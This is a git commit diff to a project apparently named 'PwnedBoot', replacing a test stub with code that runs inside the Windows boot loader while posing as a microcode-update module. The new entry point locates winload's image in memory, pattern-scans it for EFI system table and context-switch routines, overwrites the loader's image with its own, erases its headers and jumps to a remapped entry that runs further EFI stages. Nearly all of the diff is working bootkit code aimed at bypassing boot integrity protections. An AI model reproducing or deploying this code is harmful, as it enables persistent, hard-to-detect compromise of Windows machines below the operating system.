6bba8242885cc14e8ba753c026347802242ee816
ebaaay <enlias.gamer@gmail.com>
2025-12-22 19:52:10 -0300

    hsdsdsdsdsdsd

--- PwnedBoot/Entry.cpp
+++ PwnedBoot/Entry.cpp
@@ -17,8 +17,77 @@ EXTERN_C NTKERNELAPI PVOID NTAPI RtlFindExportedRoutineByName(PVOID imageBase, P
 
 EXTERN_C NTSTATUS EntryPoint()
 {
-    // If this freezes the PC, the DLL LOADED successfully.
-    // If it still reboots to recovery, the DLL is NOT loading (DSE/Secure Boot blocking).
-    while (true) { __halt(); }
-    return STATUS_SUCCESS;
+    /*
+     * The entry point will be first executed from winload.efi
+     * and then 2 times from the ntoskrnl.exe if the boot continues.
+     */
+
+    ULONG64 returnAddress = reinterpret_cast<ULONG64>(_ReturnAddress());
+
+    // Search for MZ signature (0x5A4D) in 4KB increments (page aligned)
+    // This is more robust than looking for DOS prompt strings.
+    ULONG64 searchBase = returnAddress & ~0xFFF;
+    int limit = 0;
+    while (*reinterpret_cast<USHORT*>(searchBase) != 0x5A4D && limit < 0x1000) {
+        searchBase -= 0x1000;
+        limit++;
+    }
+
+    if (limit >= 0x1000) {
+        // Fallback: search byte by byte if page-aligned search fails (unlikely)
+        searchBase = returnAddress;
+        while (*reinterpret_cast<USHORT*>(searchBase) != 0x5A4D)
+            searchBase--;
+    }
+
+    const ULONG64 moduleBase = searchBase;
+
+    // Search for SystemTable and ImageHandle
+    // Patterns for Windows 10/11
+    ULONG64 systemTableScan = Utils::FindPatternImage(reinterpret_cast<PVOID>(moduleBase), "48 8B 05 ? ? ? ? 33 FF 4C 8B E9 48 8B 68 18 48 85 ED 75 0A");
+    if (!systemTableScan) systemTableScan = Utils::FindPatternImage(reinterpret_cast<PVOID>(moduleBase), "48 8B 05 ? ? ? ? 48 8B 40 18 48 8B 50 20");
+    if (!systemTableScan) systemTableScan = Utils::FindPatternImage(reinterpret_cast<PVOID>(moduleBase), "48 8B 05 ? ? ? ? 33 FF 48 8B E9");
+
+    if (!systemTableScan)
+        return STATUS_INVALID_PARAMETER_1;
+
+    const ULONG64 ptrAddress = (systemTableScan + 7) + *reinterpret_cast<int*>(systemTableScan + 3);
+    const ULONG64 resolvedSystemTable = *reinterpret_cast<ULONG64*>(ptrAddress);
+    const ULONG64 resolvedImageHandle = *reinterpret_cast<ULONG64*>(ptrAddress + 8);
+
+    EFI::Stage0(reinterpret_cast<PVOID>(resolvedImageHandle), reinterpret_cast<PVOID>(resolvedSystemTable));
+
+    // Find BlpArchSwitchContext
+    BlpArchSwitchContext = reinterpret_cast<BlpArchSwitchContext_t>(Utils::FindPatternImage(reinterpret_cast<PVOID>(moduleBase), "40 53 48 83 EC 20 48 8B 15"));
+    if (!BlpArchSwitchContext) BlpArchSwitchContext = reinterpret_cast<BlpArchSwitchContext_t>(Utils::FindPatternImage(reinterpret_cast<PVOID>(moduleBase), "48 8B C4 48 89 58 08 4c 89 48 20 40 56 48 83 ec 30"));
+    if (!BlpArchSwitchContext) BlpArchSwitchContext = reinterpret_cast<BlpArchSwitchContext_t>(Utils::FindPatternImage(reinterpret_cast<PVOID>(moduleBase), "48 8B C4 48 89 58 08 48 89 68 10 48 89 70 18 48 89 78 20 41 54 41 56 41 57 48 83 EC 30"));
+
+    if (!BlpArchSwitchContext)
+        return STATUS_INVALID_PARAMETER_2;
+
+    PIMAGE_DOS_HEADER dosHeader = &__ImageBase;
+    PIMAGE_NT_HEADERS64 ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<ULONG64>(dosHeader) + dosHeader->e_lfanew);
+
+    PVOID targetBase = reinterpret_cast<PVOID>(moduleBase);
+    memcpy(targetBase, dosHeader, ntHeaders->OptionalHeader.SizeOfImage);
+
+    PVOID entry = RtlFindExportedRoutineByName(targetBase, "RemappedEntry");
+    if (!entry)
+        return STATUS_INVALID_PARAMETER_3;
+
+    memset(targetBase, 0, ntHeaders->OptionalHeader.SizeOfHeaders);
+    return reinterpret_cast<NTSTATUS(*)()>(entry)();
+}
+
+EXTERN_C __declspec(dllexport) NTSTATUS RemappedEntry()
+{
+    BlpArchSwitchContext(FirmwareContext);
+
+    EFI::Stage1();
+
+    // Menu and Boot
+    EFI::SplashScreen();
+    EFI::Exec();
+
+    INFINITE_LOOP();
 }
--- PwnedBoot/Exports.cpp
+++ PwnedBoot/Exports.cpp
@@ -1,8 +1,8 @@
 #include "Global.h"
 
-EXTERN_C __declspec(dllexport) ULONG64 McImageInfo = 0x3800000001;
+EXTERN_C ULONG64 McImageInfo = 0x3800000001;
 
-EXTERN_C __declspec(dllexport) NTSTATUS McMicrocodeOperation(void)
+EXTERN_C NTSTATUS McMicrocodeOperation(void)
 {
     return STATUS_SUCCESS;
 }
